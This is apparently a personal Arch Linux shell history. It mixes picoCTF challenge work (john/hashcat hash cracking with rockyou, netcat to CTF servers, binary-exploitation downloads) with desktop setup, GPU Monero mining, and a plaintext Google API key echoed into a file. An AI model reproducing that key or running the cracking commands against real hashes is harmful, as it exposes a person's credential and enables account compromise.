echo -n "correcthorsebatterystaple" | sha256sum

echo -n "abc123" | sha1sum

john --fork=20 --format=raw-sha1 --wordlist=./rockyou.txt hash.txt
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O rockyou.txt
# If it downloads as .gz, you'll need to gunzip it:
# wget https://wordlists.assetnote.io/rockyou.txt.gz
# gunzip rockyou.txt.gz
echo "b7a875fc1ea228b9061041b7cec4bd3c52ab3ce3" > hash.txt
john --fork=20 --format=raw-sha1 --wordlist=./text.txt hash.txt
cat hash.txt
echo "b7a875fc1ea228b9061041b7cec4bd3c52ab3ce3" > hash.txt
john --format=raw-sha1 --wordlist=text.txt hash.txt
echo "b7a875fc1ea228b9061041b7cec4bd3c52ab3ce3" > hash.txt
john --format=raw-sha1 --wordlist=/path/to/wordlist.txt hash.txt
sudo pacman -S john
hashcat -m 100 -a 0 b7a875fc1ea228b9061041b7cec4bd3c52ab3ce3 text.txt
touch text.txt
hashcat -m 100 -a 0 b7a875fc1ea228b9061041b7cec4bd3c52ab3ce3 /home/bb/ctf/pbctf/hashcrack
hashcat -m 100 -a 0 b7a875fc1ea228b9061041b7cec4bd3c52ab3ce3 wordlist.txt
hashcat -m 100 -a 0 b7a875fc1ea228b9061041b7cec4bd3c52ab3ce3 /path/to/wordlist.txt
sudo pacman -S hashcat
echo -n "password" | sha1sum

nc verbal-sleep.picoctf.net 57356
cd hashcrack/
mkdir hashcrack
nc mimas.picoctf.net 54896
nvim format-string-0.c
nvim format-string-0
cat format-string-0
wget https://artifacts.picoctf.net/c_mimas/78/format-string-0.c
wget https://artifacts.picoctf.net/c_mimas/78/format-string-0
cd format_string/
mkdir format_string
cat receiced.txt
cat lyric-reader.py
nvim lyric-reader.py
python lyric-reader.py
daasdfaw
sls
s
wget https://challenge-files.picoctf.net/c_verbal_sleep/60bb6b075d79b2e8a2107520060ceb97145c158f47651772fcf53dcdb3df63b1/lyric-reader.py
cd flag-hunters/
mkdir flag-hunters | cd flag-hunters
python decrypt.py
nvim decrypt.py
nc verbal-sleep.picoctf.net 60275
sudo pacman -S python-pycryptodome

sudo pacman -S python-cryptography
cat encrypt.py
cd ctf/pbctf/rsa-can-be-broken/
cd rsa-can-be-broken/
cd ctf/pbctf/bianry-search/
bc
sudo pacman -S bc
13990706293045774144702020708869551326798907443788596318558020827341875252095451801061181235149877620410321532812436465768271171327993977035109749540054862/2
nvim encrypt.py
wget https://challenge-files.picoctf.net/c_verbal_sleep/fb3f2f67055c8d276e9a963804be1061d7f4b399badeba46e61841197d8d24e8/encrypt.py

mkdir rsa-can-be-broken
./guessing_game.sh
nvim guessing_game.sh
cd home/ctf-player/drop-in/
unzip challenge.zip
rm home/ctf-player/drop-in/guessing_game.sh
cd bianry-search/
rm home/
file challenge.zip
man zip
ls /home/
ssh -p 54573 ctf-player@atlas.picoctf.net
wget https://artifacts.picoctf.net/c_atlas/5/challenge.zip
mkdir bianry-search
nvim message.txt
wget https://artifacts.picoctf.net/c/154/message.txt
nc saturn.picoctf.net 54727
mmls disk.img
man mmls
sudo pacman -S sleuthkit
mmls
sudo pacman -S mmls
sudo pacman -S intel-gmmlib
file disk.img
gunzip disk.img.gz
wget https://artifacts.picoctf.net/c/164/disk.img.gz
cd sleuthik/
mkdir sleuthik
cd forensics/
grep -R 'pico'
wget -m http://saturn.picoctf.net:55584/
wget -m http://saturn.picoctf.net:62460/
echo $status
cd safe-opener/
cd ctf/reverse_engineering/file-run1_COMPLETED/
echo 'cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz' | base64 -d
'cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz' | base64 -d
base64 -d 'cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz'
man base64
'cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz' | base64
"cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz" | base64
nvim SafeOpener.class
file SafeOpener.class
wget https://artifacts.picoctf.net/c/290/SafeOpener.class
nvim SafeOpener.java
wget https://artifacts.picoctf.net/c/83/SafeOpener.java
mkdir safe-opener
cd reverse_engineering
mkdir reverse-eng
cd ctf
lsblk
sudo umount /mnt
umount /mnt
sudo woeusbgui

woeusbgui
sudo pacman -S python-wxpython
yay -S woeusb-ng

ls Documents/Documents/
ls Documents/
cp -r  /mnt/Users/bhuva/Documents/ ~/Documents/
cp /mnt/Users/bhuva/Documents/ ~/Documents/
ls -la -h /mnt
ls -la -l /mnt
ls -la -h /mnt/games/Armored\ Core\ 6\ -\ Fires\ of\ Rubicon/
ls -la -h /mnt/games/
ls -la  /mnt/games/
ls /mnt/
sudo mount /dev/nvme0n1p3 /mnt
mount /dev/nvme0n1p3 /mnt
sudo pacman -S woeusbgui
sudo pip3 install WoeUSB-ng

ls /mnt/EFI/Microsoft/Boot/
sudo mount /dev/nvme0n1p1 /mnt
ls /boot/efi/
sudo umount  /boot/efi
umount  /boot/efi
sudo blkid /dev/nvme0n1p1
sudo nvim /etc/grub.d/40_custom
sudo os-prober
sudo pacman -S fuse3
echo ?
sudo mount /dev/nvme0n1p3  /mnt
sudo mount /dev/nvme0n1p1  /boot/efi/
nvim /etc/default/grub
sudo pacman -S os-prober ntfs-3g
ls /boot/efi/System\ Volume\ Information/
sudo umount  /mnt
umount  /mnt
sudo update-grub
sudo upadte-grub
ls /mnt/EFI/Microsoft/
ls /mnt/EFI/
mount /dev/nvme0n1p1 /mnt
cat text
pdftotext  Financial_Report_for_ABC_Labs.pdf text
atril
sudo pacman -S atril
atrial
pdftotext  Financial_Report_for_ABC_Labs.pdf
sudo pacman -S poppler
sudo pacman -S python-pdftotext
strings Financial_Report_for_ABC_Labs.pdf
evince Financial_Report_for_ABC_Labs.pdf
sudo pacman -S evince
emacs Financial_Report_for_ABC_Labs.pdf
file Financial_Report_for_ABC_Labs.pdf
cd redacted-gone-wrong/
mv Financial_Report_for_ABC_Labs.pdf redacted-gone-wrong/
wget https://artifacts.picoctf.net/c/84/Financial_Report_for_ABC_Labs.pdf
mkdir redacted-gone-wrong
netdump  network-dump.flag.pcap
strings network-dump.flag.pcap
sudo pacman -S wireshark-qt
sudo pacman -S wireshark-cli
sudo pacman -S wireshark-
sudo pacman -S pcap
sudo pacman -Ss pcap
pcap-config
file network-dump.flag.pcap
yay -S netdump
sudo pacman -Ss packet analyzer
yay -Ss packet analyzer
sudo pacman -Ss packet analyser
sudo pacman -Ss packet-analyser
wget https://artifacts.picoctf.net/c/196/network-dump.flag.pcap
cd packets/
mkdir packets
cd..
mplayer morse_chal.wav
sudo pacman -S mplayer
file morse_chal.wav
wget https://artifacts.picoctf.net/c/79/morse_chal.wav
cd morse_code/
mkdir morse_code
cd cryptography/
grep -o 'picoCTF{.*}' anthem.flag.txt
man grep
wget https://artifacts.picoctf.net/c/124/anthem.flag.txt
cd lookey_here/
mkdir lookey_here
cat flag
file flag
unxz flag.xz
mv flag.out  flag.xz
file flag.out
lzip -d flag
lzop -d flag.lzop
file flag.out.lz4
lzip flag
rm flag
lzip -d flag.lzop
rm flag.out
lzop -x flag.lzop
mv flag flag.lzop
sudo pacman -S lzop
file  flag
unlzma flag.lzma
lzma flag.lzma
mv flag flag.lzma
mc flag flag.lzma
unlzma flag
lz4 -d flag.out flag
lz4 -d flag.out
file  -d flag.lz4
file flag.lz4
lz4 flag
lz4 flag.out.lz4  flag
file flag.out flag
lz4 flag.out
sudo pacman -S lzip
man lzip
gunzip flag.gz
mv flag.out  flag.gz
gunzip
sudo pacman -S gzip2
file flag.cpio
bunzip2 flag.
bunzip2 flag
bzip2
cpio --file flag.cpio  --extract
cpio --file flag.cpio  -i
sudo pacman -S cpio
mv flag flag.cpio
nvim flag
ar xv flag
./Flag.pdf
chmod +x Flag.pdf
sudo pacman -S sharutils
nvim Flag.pdf
cd file-types/
mv Flag.pdf  file-types/
wget https://artifacts.picoctf.net/c/81/Flag.pdf
mkdir file-types
cd fore
cat flaaag.txt
cat flag.txt
save
./run "Hello!" | grep -oE  "picoCTF{.*}" --color=none
nvim /opt/save.fish
./get_flag.sh
./run "Hello!" | grep -oE  "picoCTF{.*}"
./run "Hello!"
./run "hello!"
./run "hello"
./run
file run
chmod +x run
wget https://artifacts.picoctf.net/c/155/run
cd file-run2/
mkdir file-run2
./run | grep -oE "picoCTF{.*}" --color=none
rm flag.txt
cat  ~/.config/fish/config.fish
source  ~/.config/fish/config.fish
nvim ~/.config/fish/config.fish
source ./save.fish
sudo mv  save.fish  /opt/
mv  save.fish  /opt/
./save.fish
rm save.sh
rm get_flag.fish
./get_flag.fish
nvim save.fish
chmod +x save.fish
./save.sh
nvim save.sh
nvim
echo "122242"
cat save.sh
source save.sh
chmod +x save.sh
history -n10 -l
history -n10
./run | grep -oE "picoCTF{.*}"
sudo mv finish.sh  /opt/
mv finish.sh  /opt/
nvim finish.sh
./finish.sh
chmod +x finish.sh
wget https://artifacts.picoctf.net/c/220/run
cd file-run1/
mkdir file-run1
mkdir  reverse_engineering
cat get_flag_cmd
nvim get_flag_cmd
echo "cat "file_name" | grep "</tspan" | cut -d ">" -f2 | cut -d "<" -f1 | tr -d "\n" | tr -d " "" > get_flag_cmd
cat drawing.flag.svg  | grep "</tspan" | cut -d ">" -f2 | cut -d "<" -f1 | tr -d "\n" | tr -d " "
cat drawing.flag.svg
nvim drawing.flag.svg
hexdump  drawing.flag.svg  | less
strings drawing.flag.svg | less
strings drawing.flag.svg
exiftool drawing.flag.svg
sudo pacman -S perl-image-exiftool
cd svg/
mv drawing.flag.svg  svg/
file drawing.flag.svg
wget https://artifacts.picoctf.net/c/101/drawing.flag.svg
mkdir svg
mkdir -p forensics
yay -Ss cyber chef
yay -Ss cyber-chef
sudo pacman -Ss cyber-chef
sudo pacman -Ss cyberchef
sudo pacman -Ss cyber chef
sudo pacman -Ss rot 13
sudo pacman -Ss rot13
sudo pacman -S bsdgame
sudo pacman -Ss bsdgames
sudo pacman -S bsdgames
echo "cvpbPGS{P7e1S_54I35_71Z3}" |tr 'A-Za-z' 'N-ZA-Mn-za-m'

nvim leak/passwords.txt
tar -xvf leak.tar
wget https://artifacts.picoctf.net/c/151/leak.tar
mkdir -p cryptography
nc saturn.picoctf.net 49236
man gets
wget https://artifacts.picoctf.net/c/173/vuln.c
chmod +x vuln
file vuln
cd buffer-overflow-0/
mv vuln buffer-overflow-0/
wget https://artifacts.picoctf.net/c/173/vuln
mkdir buffer-overflow-0
cd binary-exploitation/
mkdir -p binary-exploitation
nc verbal-sleep.picoctf.net 63285
cat message.txt
cat me
wget https://artifacts.picoctf.net/c/129/message.txt
nc saturn.picoctf.net 65151
nvim program-redacted.c
yay -S sublime
sudo pacman -Ss sublime
sudo pacman -Ss subl
sudo pacman -S subl
sudo pacman -S sublime
sudo pamcan -S sublime
wget https://artifacts.picoctf.net/c/141/program-redacted.c
mkdir -p ctf
# Install from official repos
sudo pacman -S binwalk exiftool steghide foremost

# Install from AUR
yay -S autopsy volatility3

# Install zsteg (for image steg) via RubyGems
sudo pacman -S ruby # Make sure Ruby is installed
gem install zsteg
sudo pacman -S python-pwntools
sudo pacman -S pwntools
yay -S ghidra rizin-cutter checksec
# Install from official repos
sudo pacman -S gdb strace ltrace radare2

# Install from AUR
yay -S ghidra rizin-cutter checksec

# Install pwntools via pip
pip install pwntools
# Install from official repos
sudo pacman -S sqlmap gobuster

# Install from AUR
yay -S feroxbuster burpsuite
sudo pacman -S net-tools
man malloc
sudo make install
nvim config.h
xclip
nvim con
cd chadwm/
find . -name "sxhkdrc"

cd ~/.config/chadwm/
cd  .config/chadwm/chadwm/
mkdir -p ~/.config/sxhkd/
pacman -Qs sxhkd
ps aux | grep sxhkd
sxhkd
nvim  ~/.config/sxhkd/sxhkdrc
nano ~/.config/sxhkd/sxhkdrc
sudo pacman -S sxhkd
cd .config/chadwm/chadwm/
gammastep  -x
nvim .config/chadwm/chadwm/config.h
gammastep -o -O 3700K
gammastep -o -O 4500K
chmod +x ~/.local/bin/toggle-filter.sh
mkdir -p ~/.local/bin
nano ~/.local/bin/toggle-filter.sh
sudo pacman -S gammastep
ps -aux | grep aimlab
pkill    285621
ps -aux aimlab
ps -aux
ps -aux | grep aim
baobab
pacman -Ss storage gui
pacman -Ss storage
ps -aux | grep zen
sudo pacman -Ss proton
sudo pacman -S proton
sudo pacman -S baobab
pacman -Ss baobab
gnome-disks
sudo pacman -S gnome-disk-utility
pacman -Ss gnome disk
gdu
sudo pacman -S gdu
erdtree
sudo pacman -S erdtree
ncdu
pacman -Ss disk anal
pacman -Ss disk-anal
pacman -Ss disk analyser
steam
sudo pacman -S steam
pacman -Ss steam
rm DaVinci_Resolve_20.0.1_Linux.zip
rm DaVinci_Resolve_20.0.1_Linux.run
./DaVinci_Resolve_20.0.1_Linux.run
find -name DaVinci ~/
find -name DaVinci ~
find -name DaVinci
unzip DaVinci_Resolve_20.0.1_Linux.zip
ls -h -l -p essentials-of-compilation.pdf
ls essentials-of-compilation.pdf
open essentials-of-compilation.pdf
echo "AIzaSyAxeBRN8_VJQZ4wbcH05ajF9tY6fRU-9G0" > gemini-api.txt
la
pip install -q -U google-genai

source gemini-api/bin/activate.fish
python -m  venv gemini-api
easyeffects
asbdjabcbacsasbdjabcbacs
sudo systemctl restart bluetooth

sudo nvim /etc/bluetooth/input.conf
nvim /etc/bluetooth/input.conf
echo "uhid" | sudo tee /etc/modules-load.d/uhid.conf

sudo modprobe uhid

curl https://openai.com/index/chatgpt/
sudo modprobe uhid

lsmod | grep uhid

uname -r
# Should show something like: 6.xx.arch1-1

sudo pacman -S linux linux-headers

lsmod | grep hid

sudo dmesg | grep -i bluetooth

bluetoothctl list
bluetoothctl show
bluetoothctl devices
lsusb
dmesg | grep -i bluetooth

sudo nano /var/lib/bluetooth/<adapter-mac>/<device-mac>/info

lsmod | grep bluetooth

bluetoothctl

sudo systemctl enable bluetooth.service

systemctl status bluetooth.service

rfkill list bluetooth

bluetoothctl
bluetoothctl scan on
bluetoothctl default-agent
bluetoothctl agent on
bluetoothctl power on
sudo systemctl enable bluetooth.service
sudo systemctl start bluetooth.service

# For a GUI interface
sudo pacman -S blueman

man fseek
sudo mandb

sudo pacman -S glibc

sudo pacman -S man-pages
man 3 fseek
sudo mandb
sudo pacman -S man-db
sudo pamcan -S man-db
yay -Ss manpage
pacman -Ss man |grep manpage
pacman -Ss man
pacman -Ss manpages dev
pacman -Ss manpages -dev
pacman -Ss manpages-dev
pacman -Ss manpages
pacman -Ss manpage
mkdir -p Downloads/
ls past-donwload-dump/
\ls Downloads
mv Downloads/ past-donwload-dump/
mkdir -p past-donwload-dump
xset dpms force off 
screen 5
xset dpms force on
xset dpms force off
screen
xset dpms 1
xset
yay -Ss hollow knight
zen-browser
yay -S gpu-stress-test-git
yay -Ss nvidia gpu test
yay -S nvidia gpu test
occt
sudo pacman -S occt
pacman -Ss gpu test
gputest
gputest_gui.py
sudo pacman -S tk
sudo pacman -S nvidia-settings

yay -S  gputest
sudo pacman -S gputest
yay -Ss gputest
sudo pacman -Ss gpu test
sudo pacman -Ss gputest
sudo pacman -S gpu test
pacman -S gputest
yay -S btop-git

sudo pacman -R btop

sudo pacman -S intel-ucode

lscpu | grep "Model name"
uname -r

cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq

fastfetch
sudo pacman -S fastfetch
cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_driver

sudo pacman -S btop
rm -r ~/.config/btop

btop --debug
cat /proc/cpuinfo | grep 'model name'
sensors

sudo btop
cat opendata-2025-07-09-000001+0000.jsonl -n 50
cat opendata-2025-07-09-000001+0000.jsonl
unzip opendata-latest.zip
blender
yay -Ss davin
pacman -Ss da
pacman -Ss davin
pacman -Ss davinci
sudo pacman -S blender
pacman  -Ss blender
nvim .xinitrc
redshift
sudo pacman -S redshift
pacman -Ss redshift
echo "ola"
ech "ola"
neovim
sudo pacman -S neovim
sudo pamcan -S neovim
sudo nvim /etc/default/grub
sudo grub-mkconfig -o /boot/efi/grub/grub.cfg

sudo os-prober

sudo pacman -S os-prober
pacman -Q os-prober

sudo ./theme_selector.sh
./theme_selector.sh
cd hollow-grub/
cd /boot/efi/grub/themes/
ls /boot/efi/grub/themes/hollow-grub/
sudo mkdir -p /boot/efi/grub/themes/
sudo cp -r /boot/grub/themes/hollow-grub /boot/efi/grub/themes/

sudo find /boot /boot/efi -name grub.cfg

find /boot /boot/efi -name grub.cfg

yay -S grub-theme-hollow-knight
sudo ./install_theme.sh
chmod +x install_theme.sh
nvim install_theme.sh
cd hollow-knight-grub-theme/
git clone https://github.com/sergoncano/hollow-knight-grub-theme.git
cat /etc/default/grub
ls /etc/default/grub
ls grub-cpy/
cp  /boot/efi/grub/grub.cfg  ~/grub-cpy/
mkdir grub-cpy
/boot/grub/grub.cfg
ls /boot/efi/grub/grub.cfg
xprop | grep WM_CLASS

pgrep -x picom

./zen
cd browser/
cd zen/
tar -xJf zen.linux-x86_64.tar\(1\).xz
yay -S zen-browser-bin
yay -Ss zen browser
yay -Ss zen
yay -Ss zen-browser
pacman -Ss zen-browser
pacman -Ss zen browser
pacman -Ss zen broswer
pacman -Ss zen brozwer
pacman -Ss zen
ps -aux | grep easy
ps -aux | grep irq
ps -aux | grep sch
ps -aux | grep kernel
ps -aux | grep mm/
ps -aux | grep mm
ps -aux | grep kth
ps -aux | grep firefox
bashtop
bpytop
sudo pacman -S bpytop
sudo pacman -S bashtop
pacman -Ss resource monitor
nmty
termdown
termdown --help
yay -Ss lmbench
pacman -Ss lmbench
lmbench
history  -n 50
date
timectl
time
termdown --helpwhile true; do
clear
date +"%T" | figlet
sleep 1
done

sudo pacman -S tty-clock
tty-clock -s -c -C 2

sudo pacman -S figlet

watch -n 60 date
pacman -Ss ttyclock
sudo pacman -S termdown
pacman -Ss terminal timer
pacman -Ss timer
timer
nmcli
brightnessctl set 50%
brightnessctl set 60%
nm
cat /sys/devices/system/cpu/power/runtime_status
cat /sys/devices/system/cpu/power/
cat /proc/cpuinfo | grep 'processor'
ls /sys/devices/system/cpu/

top
./fork
gcc -o fork fork.c
nvim fork.c
echo "#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

int main(int argc, char *argv[]) {
    printf("hello (pid:%d)\n", (int) getpid());
    int rc = fork();
    if (rc < 0) { // fork failed; exit
        fprintf(stderr, "fork failed\n");
        exit(1);
    } else if (rc == 0) { // child (new process)
        printf("child (pid:%d)\n", (int) getpid());
    } else { // parent goes down this path
        int rc_wait = wait(NULL);
        printf("parent of %d (rc_wait:%d) (pid:%d)\n",
               rc, rc_wait, (int) getpid());
    }
    return 0;
}
" > fork.c
cd OSTP/
echo "#include<stdio.h>
#include <stdlib.h> 
#include <unistd.h> 

int main(int argc, char *argv[] )
{
printf("hello pid : %d\n", (int) getpid());
int rc =fork90;
if(rc < 0) {
//fork failed
fprintf(stderr,"fork falied" /n);
exit(1);
else if(rc == 0)
 printf("child pid : %d\n", (int) getpid());
}
else
{
printf("parent of %d sid : %d \n",
           rc,(int)getpid());
}
return 0;
}" > fork.c
echo "#include<stdio.h>
#include <stdlib.h> 
#include <unistd.h> 

int main(int argc, char *argv[] 
{
printf("hello pid : %d\n", (int) getpid());
int rc =fork90;
if(rc < 0) {
//fork failed
fprintf(stderr,"fork falied" /n);
exit(1);
else if(rc == 0)
 printf("child pid : %d\n", (int) getpid());
}
else
{
printf("parent of %d sid : %d \n",
           rc,(int)getpid());
}
return 0;
}" > fork.c
echo "#include<stdio.h>
#include <stdlib.h> 
#include <unistd.h> 

int main(int argc, char *argv[] 
{
printf("hello (pid : %d)\n", (int) getpid());
int rc =fork90;
if(rc < 0) {
//fork failed
fprintf(stderr,"fork falied" /n);
exit(1);
else if(rc == 0)
 printf("child (pid : %d)\n", (int) getpid());
}
else
{
printf("parent of %d (pid : %d) \n",
           rc,(int)getpid());
}
return 0;
}" > fork.c
echo "#include<stdio.h>
#include <stdlib.h> 
#include <unistd.h> 

int main(int argc, char *argv[] 
{
printf("hello (pid:%d)\n", (int) getpid());
int rc =fork90;
if(rc < 0) {
//fork failed
fprintf(stderr,"fork falied" /n);
exit(1);
else if(rc == 0)
 printf("child (pid:%d)\n", (int) getpid());
}
else
{
printf("parent of %d (pid:%d) \n",
           rc,(int)getpid());
}
return 0;
}" > fork.c
echo "#include<stdio.h>
#include <stdlib.h> 
#include <unistd.h> 

int main(int argc, char *argv[] 
{
printf("hello (pid : %d)\n", (int) getpid());
int rc =fork90;
if(rc < 0) {
//fork failed
fprintf(stderr,"fork falied" /n);
exit(1);
else if(rc == 0)
 printf("child (pid:%d)\n", (int) getpid());
}
else
{
printf("parent of %d (pid: %d) \n",
           rc,(int)getpid());
}
return 0;
}" > fork.c
echo "#include<stdio.h>
#include <stdlib.h> 
#include <unistd.h> " > fork.c
echo "#include<stdio.h>
    #include <stdlib.h> #include <unistd.h> " > fork.c
cat fork.c
echo "#include<stdio.h>
    #include <stdlib.h>
   #include <unadawistd.h> " >> fork.c
echo "#include<stdio.h>
    #include <stdlib.h>
   #include <unadawistd.h> " > fork.c
echo "#include<stdio.h>
    #include <stdlib.h>
   #include <unistd.h> " > fork.c
mkdir OSTP
mkdir --help
rm -r  help
rm -r m help
rm help
mkdir help
cat .config/chadwm/chadwm/config.h
eww open dashboard
cat .config/chadwm/scripts/bar.sh
cat .config/chadwm/scripts/run.sh
source ~/.bashrc  # or source ~/.zshrc

eww reload
nvim ~/.config/eww/eww.scss
nvim ~/.config/eww/src/dashboard.yuck
nvim ~/.config/eww/eww.yuck
eww reload
eww open eww

cat .config/eww/eww.yuck
eww open widgets
cat eww/eww.yuck
eww daemon
eww open audioSliders
ls ~/.config/eww/src/dashboard.yuck
ls ~/.config/eww/
cp -r eww ~/.config/
cp eww ~/.config/
eww opwn audioSliders
eww audioSliders
ls focal/
cd eww/
rofi
pacman -Ss rofi
rasi
cd themes/
cd rofi/
nvim scripts/bar.sh
./scripts/bar.sh
cd .config/chadwm/
./scripts/statusbar.sh
cat scripts/statusbar.sh
cat scripts/bar_themes/catppuccin
ls Pictures/Wallpapers/
ls Downloads/
nvim scripts/run.sh
cat scripts/run.sh
./scripts/fetch
cat scripts/fetch
nvim ~/.config/chadwm/scripts/statusbar.sh
chmod +x ~/.config/chadwm/scripts/statusbar.sh

yay -Ss eww
sudo pacman -Ss eww
rm -rf .config/eww/
nvim .config/eww/eww.yuck
eww list-windows
eww windows
eww open topbar
eww close-all
eww kill
cat /org/freedesktop/UPower/devices/battery_BAT0
nvim .config/eww/src/topbar.yuck
nvim .config/eww/eww.scss
eww close
eww
eww logs
eww stop
eww close eww
eww open eww
eww --version
eww -c ~/.config/eww validate

eww validate

eww daemmon
./system
cat eww.scss
eww open system
eww open
eww ope
ping gnu.org
cd .config/chadwm/eww/
cat .config/chadwm/eww/scripts/fetch
ls .config/chadwm/eww/scripts/
ls .config/chadwm/eww/
ls -lh Downloads/
ls -lh ./
ls eww
eww open -h
eww --help
rm -rf lsp-plugins/
rm lsp-plugins/
lv2ls | grep lsp
git clone https://github.com/sadko4u/lsp-plugins
cd lsp-plugins
make lv2
sudo make install

lv2ls | grep LSP
locate parametric_eq_x16
sudo updatedb
locate parametric_eq_x16

export LV2_PATH=/usr/lib/lv2
lv2ls | grep LSP

ls /usr/lib/lv2 | grep lsp

yay -S lsp-plugins-lv2

pkill easyeffects && easyeffects &

lv2ls | grep LSP

sudo pacman -R easyeffects
yay -S easyeffects-git

export LV2_PATH=/usr/lib/lv2

sudo pacman -S lsp-plugins-lv2

sudo pacman -S lv2 calf zam-plugins mda.lv2

nvim ~/.config/easyeffects/presets/TANGZU-Waner.json

mkdir -p ~/.config/easyeffects/presets

rm ~/.config/easyeffects/output/TANGZU-Waner.json
nvim ~/.config/easyeffects/output/TANGZU-Waner.json

sudo pacman -S lsp-plugins calf ladspa tap-plugins mda.lv2 zam-plugins

yay -S tap-plugins

easyeffects  --help
easyeffects  help
easyeffects --list-presets

sudo pacman -S easyeffects lsp-plugins

cat Downloads/TANGZU\ Wan\'er\ S.G\ ParametricEq.txt
cp ~/.config/easyeffects/output/warner_eq.json  ./
mv warner_eq.json  ~/.config/easyeffects/output/
nvim warner_eq.json
mkdir -p ~/.config/easyeffects/output/

pactl info | grep "Server Name"

sudo pacman -S easyeffects calf rnnoise libbs2b rubberband

sudo pacman -S lsp-plugins

pw-top

pipewire --version

cat /proc/asound/version

pipewire
logout
sudo pacman -S easyeffects
pacman  -Ss easyeffects
pacman  -Ss eq
pacman  -Ss music
python  ./process-run.py -l 5:100,5:100
python  process-run.py -l 5:100,5:100
cat README-process-run
tar -xvzf HW-CPU-Intro.tgz
./process-run.py -l 4:100,1:0.
./process-run.py -l 4:100,1:0
cat process-run.py
rm  dwm-6.5.tar.gz
rm  2017-04-10-raspbian-jessie\(2\).zip 2025-05-13-raspios-bookworm-armhf-lite.img  Filled_Feedback_Summary_27-06-2025\ 09_36_23.xlsx  Grand\ Theft\ Auto\ V\ \[FitGirl\ Repack\].torrent  Gmail\ -\ How\ To\ Redeem_\ Linux\ Foundation\ LiFT\ Scholarship.pdf
rm Miniproject_front_page_format-1.pdf
rm Miniproject_front_page_format-1.docx
rm Miniproject_front_page_format-1\(2\).docx
rm Miniproject_front_page_format-1\(1\).docx
cat /usr/lib/libcuda.so
cat /usr/lib
sudo pacman -S cuda cudnn
nvidia smi
exit
chsh -s /usr/bin/fish
which fish
man chsh
help
man brightnessctl
docker restart
docker reestart
docker kill 06f600639ea1
docker kill 06c1823a376d
docker kill 92c92668e1ed
man screen
feh --bg-fill  ~/Pictures/Wallpapers/wallhaven-yqjdpd_1920x1080.png
feh --bg-max ~/Pictures/Wallpapers/wallhaven-9o57x1_1920x1080.png
feh --bg-center  ~/Pictures/Wallpapers/wallhaven-9o57x1_1920x1080.png
feh --bg-tile  ~/Pictures/Wallpapers/wallhaven-9o57x1_1920x1080.png
fdisk
sudo gparted
sudo pacman -S gparted
sudo fdisk /dev/nvme0n1
fdisk /dev/nvme0n1
bldisk
./FreeCAD_1.0.1-conda-Linux-x86_64-py311.AppImage
sudo pacman -Ss librecad
chmod +x FreeCAD_1.0.1-conda-Linux-x86_64-py311.AppImage
sudo pacman -S libreoffice
sudo pacman -Ss libreoffice
sudo pacman -Ss libre office
sudo pacman -Ss libra office
sudo pacman -Ss libraoffice
sudo pacman -Ss libra-office
sudo pacman -Ss libra
sudo pacman -R chromium
chromium
sudo pacman -S chromium
yay -S gcc13
yay -S gcc-13
yay -Ss gcc 13
sudo pacman -S gcc13
sudo rm /usr/bin/gcc-13 /usr/bin/g++-13
rm /usr/bin/gcc-13 /usr/bin/g++-13
make -j$(nproc)
cmake .. -DCMAKE_POLICY_VERSION_MINIMUM=3.5
cmake ..
cd build/
mkdir build
cd xmrig-cuda-6.21.0-mo1/
tar -xvzf xmrig-cuda-6.21.0-mo1.tar.gz
rm -r xmrig-cuda-6.22.1-mo1/
cd xmrig-cuda-6.22.1-mo1/
tar -xvzf xmrig-cuda-6.22.1-mo1.tar.gz
yay -S xmrig-mo-cuda
/usr/bin/gcc-13
sudo ln -s /usr/bin/gcc /usr/bin/gcc-13
sudo ln -s /usr/bin/g++ /usr/bin/g++-13
sudo pacman -R xmrig-mo-bin-debug
sudo pacman -R xmrig-mo-bin
yay -Ss xmrig cuda
cmake .. -DCMAKE_CXX_STANDARD=15.1.1



cmake .. -DCMAKE_CXX_STANDARD=17
cmake .. -DCUDA_LIB=/usr/local/cuda/lib64/stubs/libcuda.so -DCUDA_TOOLKIT_ROOT_DIR=/opt/cuda
cd xmrig-cuda/
ls /opt/cuda/
pacman -Qql cuda-tools
yay -Ss cuda toolkit
pacman -Ss cuda toolkit
cuda
git clone https://github.com/xmrig/xmrig-cuda.git
rm -r xmrig/ -f
cd xmrig/
makepkg  -si
~/.cache/yay/xmrig-cuda/
vim ~/.cache/yay/xmrig-cuda/PKGBUILD
vi ~/.cache/yay/xmrig-cuda/PKGBUILD
vi ~/.cache/yay/xmrig-cuda/src/xmrig-cuda-6.22.1/CMakeLists.txt
pacman -Ss gcc 13
pacman -Ss gcc-13
yay -S xmrig-cuda
ls CMakeFiles/
make
cd ~/xmrig
rm -rf build
mkdir build && cd build
cmake .. -DWITH_CUDA=ON

./xmrig -o pool.supportxmr.com:443 -u 48PVVPy1isNPrEqDSCKtjjGeucXWCm4a3a3tPDFrkSjFSHXLavXvDywScHjo141VcVPE6xd6pAgiufgJdi87FAUtEKhpMGq -k --tls --cuda
cmake .. -DWITH_CUDA=ON
make -j$(nproc)

nvidia-smi     # Shows GPU info
nvcc --version # Shows CUDA compiler version

sudo pacman -Syu nvidia nvidia-utils cuda base-devel cmake git hwloc

./xmrig --help | grep cuda

ld ../
mkdir build && cd build
cmake .. -DWITH_CUDA=ON
make -j$(nproc)

rm -rf build/
rm -f build/
git clone https://github.com/xmrig/xmrig.git
cd xmrig

sudo pacman -Syu nvidia nvidia-utils cuda

xmrig -o pool.supportxmr.com:443 -u 48PVVPy1isNPrEqDSCKtjjGeucXWCm4a3a3tPDFrkSjFSHXLavXvDywScHjo141VcVPE6xd6pAgiufgJdi87FAUtEKhpMGq -k --tls --cuda
xmrig -o pool.supportxmr.com:443 -u 48PVVPy1isNPrEqDSCKtjjGeucXWCm4a3a3tPDFrkSjFSHXLavXvDywScHjo141VcVPE6xd6pAgiufgJdi87FAUtEKhpMGq -k --tls
hyperfine --help
hyperfine
sudo pacman -S hyperfine
yay -Ss benchmark | grep cpu
yay -Ss benchmark | grep vul
pacman -Ss benchmark | grep "cpu"
pacman -Ss benchmark | grep cpu
pacman -Ss benchmark | grep "intel"
pacman -Ss benchmark | grep intel
pacman -Ss benchmark
